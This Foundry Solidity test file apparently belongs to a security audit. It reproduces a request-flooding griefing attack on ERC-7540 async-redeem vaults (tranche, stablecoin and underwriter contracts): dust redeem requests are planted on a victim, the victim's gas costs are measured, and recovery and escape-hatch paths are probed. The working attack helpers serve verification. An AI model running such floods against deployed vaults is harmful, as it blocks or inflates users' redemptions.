// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { ERC7540AsyncRedeem } from "../../../../../../contracts/ERC7540/ERC7540AsyncRedeem.sol";
import { Stablecoin } from "../../../../../../contracts/cap/Stablecoin.sol";
import { Tranche } from "../../../../../../contracts/cap/Tranche.sol";
import { Underwriter } from "../../../../../../contracts/cap/Underwriter.sol";
import { FloatingMarket } from "../../../../../../contracts/cap/market/FloatingMarket.sol";
import { CapDeployer } from "../../../../../../test/shared/CapDeployer.sol";
import { IAccessManaged } from "@openzeppelin/contracts/access/manager/IAccessManaged.sol";
import { console } from "forge-std/console.sol";

/// @dev Operator helper: the victim authorises it once, then it sheds any number of gifted
/// requests in a single transaction. Refutes the "one per tx" framing of recovery.
contract Shedder {
    function shed(ERC7540AsyncRedeem vault, uint256[] calldata ids, address to) external {
        for (uint256 i; i < ids.length; ++i) {
            vault.transferRequest(ids[i], to);
        }
    }
}

/// @title V_B1_RequestFlood
/// @notice Independent re-measurement of B-1 plus the probes that could refute or demote it.
contract V_B1_RequestFlood is CapDeployer {
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");
    uint256 internal constant VICTIM_SHARES = 100e18;

    function setUp() public {
        _deployCap();
    }

    // ── harness ───────────────────────────────────────────────────────────────

    function _seniorWithDebt() internal returns (Tranche t) {
        (address market, address[] memory tranches) =
            _createMarket("K2", defaultMarketOwner, defaultBorrower, capConfig.defaultTrancheWeights);
        _setMarketSlopes(market);
        FloatingMarket(market).setFixedCreditLimit(1_000_000e18);
        _fundTranche(tranches[0], makeAddr("s0"), 1_000e18);
        _fundTranche(tranches[1], makeAddr("s1"), 1_000e18);
        vm.prank(defaultBorrower);
        FloatingMarket(market).borrow(defaultBorrower, 600e18);
        t = Tranche(tranches[0]);
        _fundTranche(tranches[0], victim, VICTIM_SHARES);
        _fundTranche(tranches[0], attacker, 1e18);
        vm.prank(attacker);
        t.optOut();
    }

    /// @dev n dust requests minted on the attacker, handed to the victim newest-first (author's trick)
    function _reverseFlood(ERC7540AsyncRedeem v, uint256 n)
        internal
        returns (uint256 perReq, uint256 perXfer, uint256[] memory ids)
    {
        ids = new uint256[](n);
        vm.startPrank(attacker);
        uint256 g = gasleft();
        for (uint256 i; i < n; ++i) {
            ids[i] = v.requestRedeem(1, attacker, attacker);
        }
        perReq = (g - gasleft()) / n;
        g = gasleft();
        for (uint256 i = n; i > 0; --i) {
            v.transferRequest(ids[i - 1], victim);
        }
        perXfer = (g - gasleft()) / n;
        vm.stopPrank();
    }

    /// @dev n dust requests naming the victim as controller outright (ascending ids, no transfer)
    function _directFlood(ERC7540AsyncRedeem v, uint256 n) internal returns (uint256 perReq) {
        vm.startPrank(attacker);
        uint256 g = gasleft();
        for (uint256 i; i < n; ++i) {
            v.requestRedeem(1, victim, attacker);
        }
        perReq = (g - gasleft()) / n;
        vm.stopPrank();
    }

    struct Row {
        uint256 maxRedeem;
        uint256 redeem3;
        uint256 withdraw3;
        uint256 redeem4;
    }

    function _victimCosts(ERC7540AsyncRedeem v, uint256 legit) internal returns (Row memory r) {
        uint256 g = gasleft();
        uint256 maxShares = v.maxRedeem(victim);
        r.maxRedeem = g - gasleft();
        assertGt(maxShares, 0, "victim must be claimable");

        uint256 s = vm.snapshotState();
        vm.prank(victim);
        g = gasleft();
        v.redeem(maxShares, victim, victim);
        r.redeem3 = g - gasleft();
        vm.revertToState(s);

        s = vm.snapshotState();
        uint256 maxAssets = v.maxWithdraw(victim);
        vm.prank(victim);
        g = gasleft();
        v.withdraw(maxAssets, victim, victim);
        r.withdraw3 = g - gasleft();
        vm.revertToState(s);

        uint256 c = v.claimableRedeemRequest(legit, victim);
        vm.prank(victim);
        g = gasleft();
        v.redeem(legit, c, victim, victim);
        r.redeem4 = g - gasleft();
    }

    function _log(string memory tag, uint256 n, Row memory r, uint256 perReq, uint256 perXfer) internal pure {
        console.log(
            string.concat(
                tag,
                " n=",
                vm.toString(n),
                " maxRedeem=",
                vm.toString(r.maxRedeem),
                " redeem3=",
                vm.toString(r.redeem3),
                " withdraw3=",
                vm.toString(r.withdraw3),
                " redeem4=",
                vm.toString(r.redeem4),
                " atk/req=",
                vm.toString(perReq),
                " atk/xfer=",
                vm.toString(perXfer)
            )
        );
    }

    // ── (a) re-measure: 2-tranche senior, victim requests AFTER the flood (author's scenario) ──

    function test_a_tranche_reverseFlood_victimAfter() public {
        Tranche t = _seniorWithDebt();
        uint256[4] memory ns = [uint256(100), 300, 450, 600];
        for (uint256 i; i < ns.length; ++i) {
            uint256 snap = vm.snapshotState();
            (uint256 pr, uint256 px,) = _reverseFlood(t, ns[i]);
            vm.prank(victim);
            uint256 legit = t.requestRedeem(VICTIM_SHARES, victim, victim);
            Row memory r = _victimCosts(t, legit);
            _log("TRANCHE-REV victimAfter", ns[i], r, pr, px);
            vm.revertToState(snap);
        }
    }

    // ── (a') the same, victim's request is OLDER than the flood ───────────────

    function test_a_tranche_reverseFlood_victimBefore() public {
        Tranche t = _seniorWithDebt();
        uint256[3] memory ns = [uint256(100), 300, 600];
        for (uint256 i; i < ns.length; ++i) {
            uint256 snap = vm.snapshotState();
            vm.prank(victim);
            uint256 legit = t.requestRedeem(VICTIM_SHARES, victim, victim);
            (uint256 pr, uint256 px,) = _reverseFlood(t, ns[i]);
            Row memory r = _victimCosts(t, legit);
            _log("TRANCHE-REV victimBefore", ns[i], r, pr, px);
            vm.revertToState(snap);
        }
    }

    // ── (a'') direct flood, ascending ids, victim after ───────────────────────

    function test_a_tranche_directFlood_victimAfter() public {
        Tranche t = _seniorWithDebt();
        uint256[3] memory ns = [uint256(100), 300, 600];
        for (uint256 i; i < ns.length; ++i) {
            uint256 snap = vm.snapshotState();
            uint256 pr = _directFlood(t, ns[i]);
            vm.prank(victim);
            uint256 legit = t.requestRedeem(VICTIM_SHARES, victim, victim);
            Row memory r = _victimCosts(t, legit);
            _log("TRANCHE-DIRECT victimAfter", ns[i], r, pr, 0);
            vm.revertToState(snap);
        }
    }

    // ── (a) stablecoin ────────────────────────────────────────────────────────

    function test_a_stablecoin_reverseFlood_victimAfter() public {
        _depositStable(victim, VICTIM_SHARES);
        _depositStable(attacker, 1e18);
        Stablecoin s = stablecoin;
        uint256[4] memory ns = [uint256(100), 300, 450, 600];
        for (uint256 i; i < ns.length; ++i) {
            uint256 snap = vm.snapshotState();
            (uint256 pr, uint256 px,) = _reverseFlood(s, ns[i]);
            vm.prank(victim);
            uint256 legit = s.requestRedeem(VICTIM_SHARES, victim, victim);
            Row memory r = _victimCosts(s, legit);
            _log("STABLECOIN-REV victimAfter", ns[i], r, pr, px);
            vm.revertToState(snap);
        }
    }

    // ── (a) underwriter shares as the victim vault ────────────────────────────

    function test_a_underwriter_reverseFlood_victimAfter() public {
        Underwriter u = _deployUnderwriter();
        _fundUnderwriter(address(u), makeAddr("lp"), 1_000e18);
        _fundUnderwriter(address(u), victim, VICTIM_SHARES);
        _fundUnderwriter(address(u), attacker, 1e18);
        vm.prank(attacker);
        u.optOut();
        uint256[2] memory ns = [uint256(100), 300];
        for (uint256 i; i < ns.length; ++i) {
            uint256 snap = vm.snapshotState();
            (uint256 pr, uint256 px,) = _reverseFlood(u, ns[i]);
            vm.prank(victim);
            uint256 legit = u.requestRedeem(VICTIM_SHARES, victim, victim);
            Row memory r = _victimCosts(u, legit);
            _log("UNDERWRITER-REV victimAfter", ns[i], r, pr, px);
            vm.revertToState(snap);
        }
    }

    // ── (b) who can hold the dust: tranche needs shares, not the depositor role ──

    function test_b_tranche_nonDepositorCanFloodViaShareTransfer() public {
        Tranche t = _seniorWithDebt();
        address stranger = makeAddr("stranger");
        assertFalse(_mayDeposit(address(t), stranger), "stranger is not on the allowlist");
        vm.prank(stranger);
        vm.expectRevert(abi.encodeWithSelector(IAccessManaged.AccessManagedUnauthorized.selector, stranger));
        t.deposit(1, stranger);

        // any holder can hand 1000 wei of shares to the stranger: ERC20 transfer is ungated
        vm.prank(attacker);
        t.transfer(stranger, 1000);
        assertEq(t.balanceOf(stranger), 1000);

        vm.startPrank(stranger);
        for (uint256 i; i < 1000; ++i) {
            t.requestRedeem(1, victim, stranger);
        }
        vm.stopPrank();
        assertEq(t.balanceOf(stranger), 0, "all 1000 wei spent on 1000 requests");
        console.log("stranger (no depositor role) planted 1000 dust requests on the victim from 1000 wei of shares");
    }

    function test_b_stablecoin_permissionless_oneWeiDeposit() public {
        address stranger = makeAddr("stranger");
        _depositStable(stranger, 1_000);
        assertEq(stablecoin.balanceOf(stranger), 1_000, "1 wei of underlying -> 1 wei of cUSD");
        vm.startPrank(stranger);
        for (uint256 i; i < 1000; ++i) {
            stablecoin.requestRedeem(1, victim, stranger);
        }
        vm.stopPrank();
        console.log("stranger planted 1000 dust requests on the victim from 1000 wei of underlying");
    }

    // ── (d) recovery: bulk shed in ONE tx via an operator; ping-pong asymmetry ──

    function test_d_victimShedsAllInOneTx_viaOperator() public {
        Tranche t = _seniorWithDebt();
        uint256 n = 300;
        (uint256 pr, uint256 px, uint256[] memory ids) = _reverseFlood(t, n);
        uint256 attackerTotal = (pr + px) * n;

        Shedder sh = new Shedder();
        vm.prank(victim);
        t.setOperator(address(sh), true);

        // the victim needs the ids: no on-chain enumeration exists, they come from events
        uint256 g = gasleft();
        sh.shed(t, ids, address(0xdead));
        uint256 shedTotal = g - gasleft();

        vm.prank(victim);
        uint256 legit = t.requestRedeem(VICTIM_SHARES, victim, victim);
        g = gasleft();
        t.maxRedeem(victim);
        uint256 maxAfter = g - gasleft();
        uint256 maxShares = t.maxRedeem(victim);
        vm.prank(victim);
        g = gasleft();
        t.redeem(maxShares, victim, victim);
        uint256 redeem3After = g - gasleft();
        assertEq(t.controllerOf(legit), address(0), "legit request fully claimed");

        _logShed(n, attackerTotal, shedTotal);
        console.log(
            string.concat(" maxRedeemAfter=", vm.toString(maxAfter), " redeem3After=", vm.toString(redeem3After))
        );
    }

    function _logShed(uint256 n, uint256 attackerTotal, uint256 shedTotal) internal pure {
        console.log(
            string.concat(
                "SHED n=",
                vm.toString(n),
                " attackerTotal=",
                vm.toString(attackerTotal),
                " victimShedOneTx=",
                vm.toString(shedTotal),
                " perId=",
                vm.toString(shedTotal / n),
                " ratio(victim/attacker)%=",
                vm.toString(shedTotal * 100 / attackerTotal)
            )
        );
    }

    function test_d_pingPong_shedBackToAttackerIsWorseThanBurning() public {
        Tranche t = _seniorWithDebt();
        (,, uint256[] memory ids) = _reverseFlood(t, 10);
        // victim returns one to the attacker (73k); attacker re-gifts it (51k). Burning to 0xdead ends it.
        vm.prank(victim);
        uint256 g = gasleft();
        t.transferRequest(ids[0], attacker);
        uint256 victimBack = g - gasleft();
        vm.prank(attacker);
        g = gasleft();
        t.transferRequest(ids[0], victim);
        uint256 attackerAgain = g - gasleft();
        vm.prank(victim);
        g = gasleft();
        t.transferRequest(ids[0], address(0xdead));
        uint256 victimBurn = g - gasleft();
        // 0xdead is now the controller; nobody can move it back
        vm.prank(attacker);
        vm.expectRevert();
        t.transferRequest(ids[0], victim);
        console.log(
            string.concat(
                "PINGPONG victimBack=",
                vm.toString(victimBack),
                " attackerAgain=",
                vm.toString(attackerAgain),
                " victimBurn=",
                vm.toString(victimBurn)
            )
        );
    }

    // ── (c) the escape hatch: 4-arg path and instant path are flat under a flood ──

    function test_c_escapeHatches_flatUnderFlood() public {
        Tranche t = _seniorWithDebt();
        _directFlood(t, 600);
        vm.prank(victim);
        uint256 legit = t.requestRedeem(VICTIM_SHARES / 2, victim, victim);
        uint256 c = t.claimableRedeemRequest(legit, victim);
        assertEq(c, VICTIM_SHARES / 2, "claimable is a single storage walk, not a loop");
        vm.prank(victim);
        uint256 g = gasleft();
        t.redeem(legit, c, victim, victim);
        uint256 r4 = g - gasleft();
        // instant path ignores controllerRequests entirely
        vm.prank(victim);
        g = gasleft();
        t.instantRedeem(VICTIM_SHARES / 2, victim, victim);
        uint256 ri = g - gasleft();
        console.log(string.concat("ESCAPE n=600 redeem4=", vm.toString(r4), " instantRedeem=", vm.toString(ri)));
        assertLt(r4, 200_000);
        assertLt(ri, 200_000);
    }
}
